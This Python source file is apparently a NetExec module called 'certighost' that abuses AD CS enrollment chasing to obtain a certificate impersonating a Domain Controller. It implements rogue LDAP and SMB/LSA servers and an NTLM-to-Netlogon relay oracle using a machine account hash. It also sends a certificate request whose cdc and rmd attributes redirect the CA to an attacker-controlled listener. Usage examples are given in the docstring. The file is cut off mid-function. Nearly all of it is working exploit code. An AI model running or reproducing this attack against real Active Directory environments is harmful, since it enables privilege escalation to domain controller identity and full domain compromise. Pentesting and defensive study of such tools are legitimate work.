import calendar
import logging
import os
import socket
import struct
import sys
import threading
import time
from binascii import unhexlify
from dataclasses import dataclass
from pathlib import Path

import dns.resolver

from Cryptodome.Cipher import ARC4
from Cryptodome.Hash import MD4
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa as rsa_mod
from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, pkcs12
from cryptography.x509.oid import NameOID
from impacket import ntlm, smbserver, uuid
from impacket.dcerpc.v5 import epm, lsad, nrpc, transport
from impacket.dcerpc.v5.dtypes import DWORD, LPWSTR, NULL, PBYTE, RPC_SID, SID, ULONG
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.nrpc import checkNullString
from impacket.dcerpc.v5.rpcrt import DCERPCServer, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_NETLOGON
from impacket.ldap.ldap import LDAPSessionError
from impacket.ldap.ldapasn1 import Scope
from impacket.uuid import uuidtup_to_bin

from nxc.helpers.misc import CATEGORY, gen_random_string
from nxc.logger import nxc_logger
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.paths import NXC_PATH


# BER tags used by the custom LDAP implementation below (RFC 4511 / X.690)
BER_TAG_INTEGER = 0x02
BER_TAG_OCTET_STRING = 0x04
BER_TAG_SEQUENCE = 0x30
LDAP_TAG_BIND_REQUEST = 0x60
LDAP_TAG_BIND_RESPONSE = 0x61
LDAP_TAG_SEARCH_REQUEST = 0x63
LDAP_TAG_SEARCH_RESULT_ENTRY = 0x64
LDAP_TAG_SEARCH_RESULT_DONE = 0x65
LDAP_TAG_SASL_CREDENTIALS = 0xA3


def dns_to_netbios(domain):
    return domain.split(".")[0].upper()


def port_open(host, port, timeout=1.0):
    try:
        sock = socket.create_connection((host, port), timeout)
        sock.close()
        return True
    except OSError as e:
        nxc_logger.debug(f"Port {host}:{port} not reachable: {e}")
        return False


def resolve_hostname(hostname, nameserver):
    try:
        resolver = dns.resolver.Resolver(configure=False)
        resolver.nameservers = [nameserver]
        resolver.timeout = 5
        resolver.lifetime = 5
        return str(resolver.resolve(hostname, "A")[0])
    except Exception as e:
        nxc_logger.debug(f"DNS resolution failed for {hostname}: {e}")
        return None


def ber_len(value):
    if value < 0x80:
        return bytes([value])
    encoded = b""
    while value:
        encoded = bytes([value & 0xFF]) + encoded
        value >>= 8
    return bytes([0x80 | len(encoded)]) + encoded


def ber_int(value):
    if value == 0:
        return b"\x02\x01\x00"
    encoded = b""
    while value:
        encoded = bytes([value & 0xFF]) + encoded
        value >>= 8
    if encoded[0] & 0x80:
        encoded = b"\x00" + encoded
    return b"\x02" + ber_len(len(encoded)) + encoded


def ber_oct(data):
    if isinstance(data, str):
        data = data.encode()
    return b"\x04" + ber_len(len(data)) + data


def ber_seq(content):
    return b"\x30" + ber_len(len(content)) + content


def ber_set(content):
    return b"\x31" + ber_len(len(content)) + content


def ber_enum(value):
    return b"\x0a\x01" + bytes([value])


def ldap_msg(msg_id, tag, body):
    return ber_seq(ber_int(msg_id) + bytes([tag]) + ber_len(len(body)) + body)


def ldap_bind_resp(msg_id, result_code=0, server_creds=None):
    body = ber_enum(result_code) + ber_oct("") + ber_oct("")
    if server_creds:
        body += b"\x87" + ber_len(len(server_creds)) + server_creds
    return ldap_msg(msg_id, LDAP_TAG_BIND_RESPONSE, body)


def ldap_search_entry(msg_id, dn, attrs):
    attr_list = b""
    for attr_name, attr_values in attrs.items():
        values_encoded = b""
        for val in attr_values:
            values_encoded += ber_oct(val if isinstance(val, bytes) else val.encode())
        attr_list += ber_seq(ber_oct(attr_name) + ber_set(values_encoded))
    return ldap_msg(msg_id, LDAP_TAG_SEARCH_RESULT_ENTRY, ber_oct(dn) + ber_seq(attr_list))


def ldap_search_done(msg_id, result_code=0):
    return ldap_msg(msg_id, LDAP_TAG_SEARCH_RESULT_DONE, ber_enum(result_code) + ber_oct("") + ber_oct(""))


def ber_decode_len(data, offset):
    first_byte = data[offset]
    offset += 1
    if first_byte < 0x80:
        return first_byte, offset
    num_bytes = first_byte & 0x7F
    length = 0
    for i in range(num_bytes):
        length = (length << 8) | data[offset + i]
    return length, offset + num_bytes


def parse_ldap_pdu(data):
    _, offset = ber_decode_len(data, 1)
    id_len, offset = ber_decode_len(data, offset + 1)
    msg_id = int.from_bytes(data[offset:offset + id_len], "big")
    offset += id_len
    tag = data[offset]
    payload_len, offset = ber_decode_len(data, offset + 1)
    return msg_id, tag, data[offset:offset + payload_len]


def build_ntlm_challenge(domain_netbios, domain_dns, host_netbios, host_dns, challenge):
    msg = ntlm.NTLMAuthChallenge()
    flags = (ntlm.NTLMSSP_NEGOTIATE_UNICODE | ntlm.NTLM_NEGOTIATE_OEM | ntlm.NTLMSSP_NEGOTIATE_NTLM |
             ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO | ntlm.NTLMSSP_TARGET_TYPE_DOMAIN |
             ntlm.NTLMSSP_NEGOTIATE_VERSION | ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY |
             ntlm.NTLMSSP_REQUEST_TARGET | ntlm.NTLMSSP_NEGOTIATE_56 |
             ntlm.NTLMSSP_NEGOTIATE_128 | ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH)
    msg["flags"] = flags
    msg["challenge"] = challenge
    domain_bytes = domain_netbios.encode("utf-16-le")
    msg["domain_name"] = domain_bytes
    msg["domain_len"] = len(domain_bytes)
    msg["domain_max_len"] = len(domain_bytes)
    msg["domain_offset"] = 56
    av_pairs = ntlm.AV_PAIRS()
    av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = domain_netbios.encode("utf-16-le")
    av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = domain_dns.encode("utf-16-le")
    av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = host_netbios.encode("utf-16-le")
    av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = host_dns.encode("utf-16-le")
    av_pairs[ntlm.NTLMSSP_AV_TIME] = struct.pack("<q", 116444736000000000 + calendar.timegm(time.gmtime()) * 10000000)  # FILETIME
    msg["TargetInfoFields"] = av_pairs
    msg["TargetInfoFields_len"] = len(av_pairs)
    msg["TargetInfoFields_max_len"] = len(av_pairs)
    msg["TargetInfoFields_offset"] = 56 + len(domain_bytes)
    msg["Version"] = b"\x0a\x00\x00\x00\x00\x00\x00\x0f"
    msg["VersionLen"] = 8
    return msg.getData()


class NLOracle:
    """Netlogon oracle: relays an NTLM exchange received on the rogue LDAP server to
    NetrLogonSamLogonWithFlags so the real DC validates it without knowing the
    victim's password (MS-NRPC abuse via the machine account).
    """

    def __init__(self, dc_ip, comp_name, comp_hash, comp_domain):
        self.dc_ip = dc_ip
        self.comp_name = comp_name
        self.comp_hash = unhexlify(comp_hash)
        self.comp_domain = comp_domain
        self.machine_name = comp_name.rstrip("$")
        self.dce = None
        self.authenticator = None

    def setup(self):
        # NDR 64 transfer syntax required by some DCs for Netlogon
        ndr_bin = b"\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00"
        binding = epm.hept_map(self.dc_ip, nrpc.MSRPC_UUID_NRPC,
                               dataRepresentation=ndr_bin,
                               protocol="ncacn_ip_tcp")
        rpc_transport = transport.DCERPCTransportFactory(binding)
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        ndr_tuple = uuid.bin_to_uuidtup(ndr_bin)
        dce.bind(nrpc.MSRPC_UUID_NRPC, transfer_syntax=ndr_tuple)
        client_challenge = os.urandom(8)
        resp = nrpc.hNetrServerReqChallenge(dce, "", self.machine_name + "\x00", client_challenge)
        session_key = nrpc.ComputeSessionKeyStrongKey(None, client_challenge, resp["ServerChallenge"], self.comp_hash)
        credential = nrpc.ComputeNetlogonCredential(client_challenge, session_key)
        nrpc.hNetrServerAuthenticate3(dce, "\x00", self.comp_name + "\x00",
                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
                                      self.machine_name + "\x00", credential, 0x600FFFFF)
        dce.set_credentials(self.comp_name, "", self.comp_domain)
        dce.set_auth_type(RPC_C_AUTHN_NETLOGON)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(nrpc.MSRPC_UUID_NRPC, alter=1, transfer_syntax=ndr_tuple)
        auth = nrpc.ComputeNetlogonAuthenticator(credential, session_key)
        dce.set_session_key(session_key)
        resp = nrpc.hNetrLogonGetCapabilities(dce, "", self.machine_name, auth)
        self.authenticator = resp["ReturnAuthenticator"]
        self.dce = dce

    def validate(self, blob, challenge):
        auth_response = ntlm.NTLMAuthChallengeResponse()
        auth_response.fromString(blob)
        req = nrpc.NetrLogonSamLogonWithFlags()
        req["LogonServer"] = "\x00"
        req["ComputerName"] = self.machine_name + "\x00"
        req["ValidationLevel"] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
        req["LogonLevel"] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        req["LogonInformation"]["tag"] = req["LogonLevel"]
        ident = req["LogonInformation"]["LogonNetworkTransitive"]["Identity"]
        ident["LogonDomainName"] = auth_response["domain_name"].decode("utf-16le")
        ident["ParameterControl"] = 2**11
        ident["UserName"] = auth_response["user_name"].decode("utf-16le")
        ident["Workstation"] = ""
        req["LogonInformation"]["LogonNetworkTransitive"]["LmChallenge"] = challenge
        req["LogonInformation"]["LogonNetworkTransitive"]["NtChallengeResponse"] = auth_response["ntlm"]
        req["LogonInformation"]["LogonNetworkTransitive"]["LmChallengeResponse"] = auth_response["lanman"]
        req["Authenticator"] = self.authenticator
        req["ReturnAuthenticator"]["Credential"] = b"\x00" * 8
        req["ReturnAuthenticator"]["Timestamp"] = 0
        req["ExtraFlags"] = 0
        resp = self.dce.request(req)
        session_key = ntlm.generateEncryptedSessionKey(
            resp["ValidationInformation"]["ValidationSam4"]["UserSessionKey"], auth_response["session_key"])
        return session_key, resp["ErrorCode"], auth_response["flags"]


def patch_smb_server():
    S = smbserver.SimpleSMBServer
    if not hasattr(S, "setComputerAccount"):
        def sca(self, **kw):
            c = self._SimpleSMBServer__smbConfig
            c.set("global", "server_name", kw["computer_account_name"][:-1])
            c.set("global", "server_domain", kw["computer_account_domain"])
            for k in ("computer_account_name", "computer_account_hash", "computer_account_aes",
                       "computer_account_password", "computer_account_domain"):
                c.set("global", k, kw.get(k, "") or "")
            c.set("global", "dcip", kw["dcip"])
            self._SimpleSMBServer__server.setServerConfig(c)
            self._SimpleSMBServer__server.processConfigFile()
        S.setComputerAccount = lambda self, **kw: sca(self, **kw)
    if not hasattr(S, "getServer"):
        S.getServer = lambda self: self._SimpleSMBServer__server


class LSASrv(DCERPCServer):

    LSA_UUID = ("12345778-1234-ABCD-EF00-0123456789AB", "0.0")

    def __init__(self, netbios_name, dns_name, forest_name, domain_guid, domain_sid):
        DCERPCServer.__init__(self)
        self.handle = b"\x00" * 4 + b"LSA!" + b"\xde\xad\xbe\xef" * 2  # fake policy handle
        self.netbios_name = netbios_name
        self.dns_name = dns_name
        self.forest_name = forest_name
        self.domain_guid = domain_guid
        self.domain_sid = domain_sid
        self.addCallbacks(self.LSA_UUID, "\\PIPE\\lsarpc", {0: self.cb_close, 6: self.cb_open, 7: self.cb_query, 44: self.cb_open2, 46: self.cb_query2})

    def make_unicode_str(self, value):
        rpc_str = lsad.RPC_UNICODE_STRING()
        rpc_str["Data"] = value
        return rpc_str

    def make_rpc_sid(self):
        rpc_sid = RPC_SID()
        rpc_sid.fromCanonical(self.domain_sid)
        return rpc_sid

    def build_dns_domain_info(self):
        info = lsad.LSAPR_POLICY_DNS_DOMAIN_INFO()
        info["Name"] = self.make_unicode_str(self.netbios_name)
        info["DnsDomainName"] = self.make_unicode_str(self.dns_name)
        info["DnsForestName"] = self.make_unicode_str(self.forest_name)
        info["DomainGuid"] = self.domain_guid
        info["Sid"] = self.make_rpc_sid()
        return info

    def cb_close(self, data):
        resp = lsad.LsarCloseResponse()
        resp["PolicyHandle"] = b"\x00" * 20
        resp["ErrorCode"] = 0
        return resp.getData()

    def open_policy_response(self, response_class):
        resp = response_class()
        resp["PolicyHandle"] = self.handle
        resp["ErrorCode"] = 0
        return resp.getData()

    def cb_open(self, data):
        return self.open_policy_response(lsad.LsarOpenPolicyResponse)

    def cb_open2(self, data):
        return self.open_policy_response(lsad.LsarOpenPolicy2Response)

    def build_dns_domain_policy_info(self, info_level):
        field = "PolicyDnsDomainInfo" if info_level == 12 else "PolicyDnsDomainInfoInt"
        return field, self.build_dns_domain_info()

    def build_account_domain_policy_info(self, info_level):
        account_info = lsad.LSAPR_POLICY_ACCOUNT_DOM_INFO()
        account_info["DomainName"] = self.make_unicode_str(self.netbios_name)
        account_info["DomainSid"] = self.make_rpc_sid()
        field = "PolicyAccountDomainInfo" if info_level == 5 else "PolicyLocalAccountDomainInfo"
        return field, account_info

    def build_primary_domain_policy_info(self, info_level):
        primary_info = lsad.LSAPR_POLICY_PRIMARY_DOM_INFO()
        primary_info["Name"] = self.make_unicode_str(self.netbios_name)
        primary_info["Sid"] = self.make_rpc_sid()
        return "PolicyPrimaryDomainInfo", primary_info

    def build_server_role_policy_info(self, info_level):
        role_info = lsad.POLICY_LSA_SERVER_ROLE_INFO()
        role_info["LsaServerRole"] = 3  # PolicyServerRoleBackup
        return "PolicyServerRoleInfo", role_info

    # InformationClass (MS-LSAD) -> builder returning (field name, value)
    POLICY_INFO_BUILDERS = {
        12: build_dns_domain_policy_info,
        13: build_dns_domain_policy_info,
        5: build_account_domain_policy_info,
        14: build_account_domain_policy_info,
        3: build_primary_domain_policy_info,
        6: build_server_role_policy_info,
    }

    def cb_query_dispatch(self, data, response_class):
        try:
            query = lsad.LsarQueryInformationPolicy(data)
            info_level = int(query["InformationClass"])
        except Exception as e:
            nxc_logger.debug(f"LSA query parse failed, defaulting to level 12: {e}")
            info_level = 12  # PolicyDnsDomainInfo

        resp = response_class()
        builder = self.POLICY_INFO_BUILDERS.get(info_level)
        if builder is None:
            resp["PolicyInformation"] = NULL
            resp["ErrorCode"] = 0xC0000022
            return resp.getData()

        field_name, field_value = builder(self, info_level)
        policy_info = lsad.LSAPR_POLICY_INFORMATION()
        policy_info["tag"] = info_level
        policy_info[field_name] = field_value
        resp["PolicyInformation"] = policy_info
        resp["ErrorCode"] = 0
        return resp.getData()

    def cb_query(self, data):
        return self.cb_query_dispatch(data, lsad.LsarQueryInformationPolicyResponse)

    def cb_query2(self, data):
        return self.cb_query_dispatch(data, lsad.LsarQueryInformationPolicy2Response)


class RogueServerState:

    def __init__(self):
        self.server = None
        self.error = None


def run_rogue_smb(bind_addr, port, netbios_name, dns_name, forest_name, domain_guid, domain_sid,
                  comp_name, comp_hash, comp_pass, comp_domain, dc_ip, state):
    patch_smb_server()
    try:
        smb = smbserver.SimpleSMBServer(listenAddress=bind_addr, listenPort=port)
        smb.setSMB2Support(True)
        smb.setLogFile("")
        smb.setComputerAccount(computer_account_name=comp_name, computer_account_hash=comp_hash,
                               computer_account_aes="", computer_account_password=comp_pass,
                               computer_account_domain=comp_domain, dcip=dc_ip)
        smb_config = smb._SimpleSMBServer__smbConfig
        smb_config.set("global", "server_os", "Windows Server 2022 Standard")
        smb.getServer().setServerConfig(smb_config)
        smb.getServer().processConfigFile()
        lsa = LSASrv(netbios_name, dns_name, forest_name, domain_guid, domain_sid)
        lsa.daemon = True
        lsa.start()
        # CA follows cdc: redirects LDAP/SMB to us, then queries lsarpc over SMB
        smb.registerNamedPipe("lsarpc", ("127.0.0.1", lsa.getListenPort()))
    except OSError as e:
        state.error = e
        return
    state.server = smb
    smb.start()


class ConnState:
    def __init__(self):
        self.flags = 0
        self.signing_key = None
        self.client_cipher = None
        self.server_cipher = None
        self.seq_num = 0
        self.sealed = False
        self.challenge = b""

    def arm(self, session_key, flags):
        self.flags = flags
        self.signing_key = ntlm.SIGNKEY(flags, session_key, "Server")
        self.client_cipher = ARC4.new(ntlm.SEALKEY(flags, session_key, "Client"))
        self.server_cipher = ARC4.new(ntlm.SEALKEY(flags, session_key, "Server"))
        self.sealed = True


class RogueLDAP:

    def __init__(self, context, domain_dns, domain_netbios, base_dn, comp_name, comp_hash, comp_domain,
                 dc_ip, target_sid, target_dns, target_cn, target_sam):
        self.context = context
        self.domain_dns = domain_dns
        self.domain_netbios = domain_netbios
        self.base_dn = base_dn
        self.comp_name = comp_name
        self.comp_hash = comp_hash
        self.comp_domain = comp_domain
        self.dc_ip = dc_ip
        self.target_sid = target_sid
        self.target_dns = target_dns
        self.target_cn = target_cn
        self.target_sam = target_sam
        self.host_nb = comp_name.rstrip("$")
        self.host_dns = f"{self.host_nb}.{domain_dns}"

    def rootdse(self):
        return {
            "defaultNamingContext": [self.base_dn],
            "rootDomainNamingContext": [self.base_dn],
            "configurationNamingContext": [f"CN=Configuration,{self.base_dn}"],
            "schemaNamingContext": [f"CN=Schema,CN=Configuration,{self.base_dn}"],
            "namingContexts": [self.base_dn, f"CN=Configuration,{self.base_dn}", f"CN=Schema,CN=Configuration,{self.base_dn}"],
            "dnsHostName": [self.host_dns],
            "ldapServiceName": [f"{self.domain_dns}:{self.host_nb.lower()}$@{self.domain_dns.upper()}"],
            "supportedSASLMechanisms": ["GSSAPI", "GSS-SPNEGO", "EXTERNAL", "DIGEST-MD5"],
            "supportedLDAPVersion": ["3", "2"],
            "supportedCapabilities": ["1.2.840.113556.1.4.800", "1.2.840.113556.1.4.1670",
                                      "1.2.840.113556.1.4.1791", "1.2.840.113556.1.4.1935"],
            "domainFunctionality": ["7"],
            "forestFunctionality": ["7"],
            "domainControllerFunctionality": ["7"],
        }

    def principal(self, sam):
        return {
            "objectClass": ["top", "person", "organizationalPerson", "user", "computer"],
            "cn": [self.target_cn or sam.rstrip("$")],
            "sAMAccountName": [self.target_sam or sam],
            "objectSid": [self.target_sid],
            "objectGUID": [b"\x00" * 16],
            "userAccountControl": ["66048"],  # WORKSTATION_TRUST | TRUSTED_TO_AUTH_FOR_DELEGATION
            "objectCategory": [f"CN=Computer,CN=Schema,CN=Configuration,{self.base_dn}"],
            "dNSHostName": [self.target_dns],
            "servicePrincipalName": [f"HOST/{self.target_dns}", f"HOST/{self.target_cn or self.host_nb}"],
        }

    def seal(self, state, pdu):
        sealed, sig = ntlm.SEAL(state.flags, state.signing_key, b"", pdu, pdu, state.seq_num, state.server_cipher.encrypt)
        state.seq_num += 1
        frame = sig.getData() + sealed
        return struct.pack(">I", len(frame)) + frame

    def send_msg(self, conn, state, data, use_seal):
        if use_seal and state.sealed:
            conn.send(self.seal(state, data))
        else:
            conn.send(data)

    def handle_bind(self, conn, state, msg_id, payload, use_seal):
        off = 0
        if payload[off] != BER_TAG_INTEGER:
            return
        version_len, off = ber_decode_len(payload, off + 1)
        off += version_len
        off += 1
        name_len, off = ber_decode_len(payload, off)
        off += name_len
        auth_tag = payload[off]
        if auth_tag == LDAP_TAG_SASL_CREDENTIALS:
            off += 1
            sasl_len, off = ber_decode_len(payload, off)
            if payload[off] != BER_TAG_OCTET_STRING:
                return
            mech_len, off = ber_decode_len(payload, off + 1)
            mech = payload[off:off + mech_len].decode("utf-8", errors="replace")
            off += mech_len
            creds = b""
            if off < len(payload) and payload[off] == BER_TAG_OCTET_STRING:
                creds_len, off = ber_decode_len(payload, off + 1)
                creds = payload[off:off + creds_len]
            if mech in ("GSS-SPNEGO", "GSSAPI") and creds.startswith(b"NTLMSSP\x00") and len(creds) >= 12:
                msg_type = int.from_bytes(creds[8:12], "little")
                if msg_type == 1:
                    state.challenge = os.urandom(8)
                    challenge_msg = build_ntlm_challenge(self.domain_netbios, self.domain_dns, self.host_nb, self.host_dns, state.challenge)
                    self.send_msg(conn, state, ldap_bind_resp(msg_id, 14, challenge_msg), use_seal)  # saslBindInProgress
                    return
                if msg_type == 3:
                    nlo = NLOracle(self.dc_ip, self.comp_name, self.comp_hash, self.comp_domain)
                    try:
                        nlo.setup()
                        session_key, err, flags = nlo.validate(creds, state.challenge)
                    except Exception as e:
                        self.context.log.debug(f"NLOracle validation failed: {e}")
                        self.send_msg(conn, state, ldap_bind_resp(msg_id, 49), use_seal)
                        return
                    if err != 0:
                        self.send_msg(conn, state, ldap_bind_resp(msg_id, 49), use_seal)
                        return
                    state.arm(session_key, flags)
                    self.send_msg(conn, state, ldap_bind_resp(msg_id, 0), use_seal)
                    return
        self.send_msg(conn, state, ldap_bind_resp(msg_id, 0), use_seal)

    def handle_search(self, conn, state, msg_id, payload, use_seal):
        off = 0
        if payload[off] != BER_TAG_OCTET_STRING:
            return
        dn_len, off = ber_decode_len(payload, off + 1)
        search_dn = payload[off:off + dn_len].decode("utf-8", errors="replace")
        if search_dn == "":
            # Empty DN = RootDSE query during enrollment
            self.send_msg(conn, state, ldap_search_entry(msg_id, "", self.rootdse()), use_seal)
            self.send_msg(conn, state, ldap_search_done(msg_id, 0), use_seal)
            return
        sam = self.target_sam or "X$"
        first_rdn = search_dn.split(",")[0]
        if "=" in first_rdn:
            cn_value = first_rdn.split("=", 1)[1]
            sam = cn_value if cn_value.endswith("$") else cn_value + "$"
        self.send_msg(conn, state, ldap_search_entry(msg_id, search_dn, self.principal(sam)), use_seal)
        self.send_msg(conn, state, ldap_search_done(msg_id, 0), use_seal)

    def dispatch(self, conn, state, raw_msg, use_seal):
        msg_id, tag, payload = parse_ldap_pdu(raw_msg)
        if tag == LDAP_TAG_BIND_REQUEST:
            self.handle_bind(conn, state, msg_id, payload, use_seal)
        elif tag == LDAP_TAG_SEARCH_REQUEST:
            self.handle_search(conn, state, msg_id, payload, use_seal)

    def handle_client(self, conn):
        conn.settimeout(30)
        state = ConnState()
        buf = b""
        try:
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                buf += chunk
                while buf:
                    if not state.sealed:
                        if not buf or buf[0] != BER_TAG_SEQUENCE or len(buf) < 2:
                            break
                        msg_len, offset = ber_decode_len(buf, 1)
                        total = offset + msg_len
                        if len(buf) < total:
                            break
                        self.dispatch(conn, state, buf[:total], False)
                        buf = buf[total:]
                    else:
                        if len(buf) < 4:
                            break
                        frame_len = struct.unpack(">I", buf[:4])[0]
                        if len(buf) < 4 + frame_len:
                            break
                        framed = buf[4:4 + frame_len]
                        buf = buf[4 + frame_len:]
                        plain = state.client_cipher.encrypt(framed[16:])
                        pos = 0
                        while pos < len(plain):
                            if plain[pos] != BER_TAG_SEQUENCE:
                                break
                            seg_len, seg_offset = ber_decode_len(plain, pos + 1)
                            msg_total = seg_offset + seg_len
                            if pos + msg_total > len(plain):
                                break
                            self.dispatch(conn, state, plain[pos:pos + msg_total], True)
                            pos += msg_total
        except OSError as e:
            self.context.log.debug(f"LDAP client disconnected: {e}")
        finally:
            conn.close()

    def serve(self, bind_addr="0.0.0.0", port=389, state=None):
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server_sock.bind((bind_addr, port))
            server_sock.listen(8)
        except OSError as e:
            if state is not None:
                state.error = e
            return
        if state is not None:
            state.server = server_sock
        while True:
            try:
                conn, _ = server_sock.accept()
            except OSError as e:
                self.context.log.debug(f"Rogue LDAP listener socket closed, stopping accept loop: {e}")
                break
            threading.Thread(target=self.handle_client, args=(conn,), daemon=True).start()


MSRPC_UUID_ICPR = uuidtup_to_bin(("91ae6020-9e3c-11cf-8d7c-00aa00c091be", "0.0"))  # ICertRequestD


class CERTTRANSBLOB(NDRSTRUCT):
    structure = (("cb", ULONG), ("pb", PBYTE))


class CertServerRequest(NDRCALL):
    opnum = 0
    structure = (("dwFlags", DWORD), ("pwszAuthority", LPWSTR), ("pdwRequestId", DWORD),
                 ("pctbAttribs", CERTTRANSBLOB), ("pctbRequest", CERTTRANSBLOB))


class CertServerRequestResponse(NDRCALL):
    structure = (("pdwRequestId", DWORD), ("pdwDisposition", ULONG),
                 ("pctbCert", CERTTRANSBLOB), ("pctbEncodedCert", CERTTRANSBLOB),
                 ("pctbDispositionMessage", CERTTRANSBLOB))


def connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip):
    rpctransport = transport.DCERPCTransportFactory(binding)
    rpctransport.setRemoteHost(ca_ip)
    rpctransport.set_credentials(comp_name, "", domain, "", comp_hash)
    rpctransport.set_kerberos(False, kdcHost=dc_ip)
    dce = rpctransport.get_dce_rpc()
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(MSRPC_UUID_ICPR)
    return dce


def request_certificate(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
                        attacker_ip, rmd_value, template="Machine"):
    key = rsa_mod.generate_private_key(65537, 2048)
    hostname = f"{comp_name.rstrip('$')}.{domain}"
    csr = (x509.CertificateSigningRequestBuilder()
           .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)]))
           .add_extension(x509.SubjectAlternativeName([x509.DNSName(hostname)]), critical=False)
           .sign(key, hashes.SHA256()))
    csr_der = csr.public_bytes(Encoding.DER)
    attrs = [f"CertificateTemplate:{template}", f"SAN:dns={hostname}",
             f"cdc:{attacker_ip}", f"rmd:{rmd_value}"]  # cdc-chase redirect + impersonated DNS
    attr_bytes = checkNullString("\n".join(attrs)).encode("utf-16le")
    pctb_attribs = CERTTRANSBLOB()
    pctb_attribs["cb"] = len(attr_bytes)
    pctb_attribs["pb"] = attr_bytes
    pctb_request = CERTTRANSBLOB()
    pctb_request["cb"] = len(csr_der)
    pctb_request["pb"] = csr_der
    req = CertServerRequest()
    req["dwFlags"] = 0
    req["pwszAuthority"] = checkNullString(ca_name)
    req["pdwRequestId"] = 0
    req["pctbAttribs"] = pctb_attribs
    req["pctbRequest"] = pctb_request

    try:
        binding = f"ncacn_np:{ca_ip}[\\pipe\\cert]"
        dce = connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip)
    except Exception as e:
        nxc_logger.debug(f"Named pipe transport failed, falling back to TCP: {e}")
        binding = epm.hept_map(ca_ip, MSRPC_UUID_ICPR, protocol="ncacn_ip_tcp")
        dce = connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip)

    resp = dce.request(req, checkError=False)
    disp = resp["pdwDisposition"]
    if disp != 3:  # CR_DISP_ISSUED
        msg = b"".join(resp["pctbDispositionMessage"]["pb"]).decode("utf-16le", errors="replace")
        raise RuntimeError(f"Cert request denied (0x{disp & 0xFFFFFFFF:08x}): {msg}")
    cert_der = b"".join(resp["pctbEncodedCert"]["pb"])
    cert = x509.load_der_x509_certificate(cert_der)
    return pkcs12.serialize_key_and_certificates(b"", key, cert, None, NoEncryption())


@dataclass
class DomainControllerInfo:
    sam: str
    dns: str
    cn: str
    sid_bin: bytes
    domain_sid: str
    domain_guid: bytes
    domain_nb: str


@dataclass
class MachineAccount:
    name: str
    password: str
    hash: str


class NXCModule:
    """Module made by @azoxlpf"""

    name = "certighost"
    description = "Obtain a Domain Controller certificate via AD CS enrollment chase abuse"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.listener = None
        self.target = None
        self.ca = None
        self.template = "Machine"

    def options(self, context, module_options):
        """
        Obtain a certificate impersonating a Domain Controller via AD CS cdc-chase
        redirection to rogue SMB/LDAP services controlled by the attacker.

        LISTENER    Attacker IP for rogue SMB/LDAP services (alias: L, required)
        TEMPLATE    Certificate template name (default: Machine)
        TARGET      Computer account to impersonate, e.g. DC01$ (default: first DC)
        CA          CA hostname or IP (default: auto-discovered via LDAP)

        Examples:
        netexec ldap <ip> -u <username> -p <password> -M certighost -o L=192.168.56.1
        netexec ldap <ip> -u <username> -p <password> -M certighost -o L=192.168.56.1 -o TARGET=DC01$
        netexec ldap <ip> -u <username> -p <password> -M certighost -o L=192.168.56.1 -o CA=RD-PKI-CA
        netexec ldap <ip> -u <username> -p <password> -M certighost -o L=192.168.56.1 -o TEMPLATE=Machine
        """
        self.context = context
        self.module_options = module_options
        self.listener = module_options.get("LISTENER") or module_options.get("L")
        self.target = module_options.get("TARGET")
        self.ca = module_options.get("CA")
        self.template = module_options.get("TEMPLATE", "Machine")

    def on_login(self, context, connection):
        self.context = context

        if not self.listener:
            self.context.log.fail("LISTENER (or L) is required")
            return

        cas = self.enumerate_certificate_authorities(connection)
        if not cas:
            self.context.log.fail("No pKIEnrollmentService found in AD")
            return

        self.run_exploit(connection, cas)

    def enumerate_certificate_authorities(self, connection):
        search_base = f"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,{connection.baseDN}"
        try:
            resp = connection.search(
                searchFilter="(objectClass=pKIEnrollmentService)",
                attributes=["cn", "dNSHostName"],
                baseDN=search_base,
            )
        except Exception as e:
            self.context.log.debug(f"LDAP CA search failed: {e}")
            return []

        entries = parse_result_attributes(resp)
        cas = []
        for entry in entries:
            cn = entry.get("cn", "")
            dns_hostname = entry.get("dNSHostName", "")
            ca_ip = None
            if dns_hostname:
                ca_ip = resolve_hostname(dns_hostname, connection.host)
            cas.append({"cn": cn, "dNSHostName": dns_hostname, "ip": ca_ip or connection.host})
        return cas

    def get_target_dc(self, connection):
        if self.target:
            target_sam = self.target if self.target.endswith("$") else self.target + "$"
            search_filter = f"(&(objectCategory=computer)(sAMAccountName={target_sam}))"
            err_msg = f"Target account '{target_sam}' not found in AD"
        else:
            search_filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
            err_msg = "No Domain Controller found via LDAP"

        try:
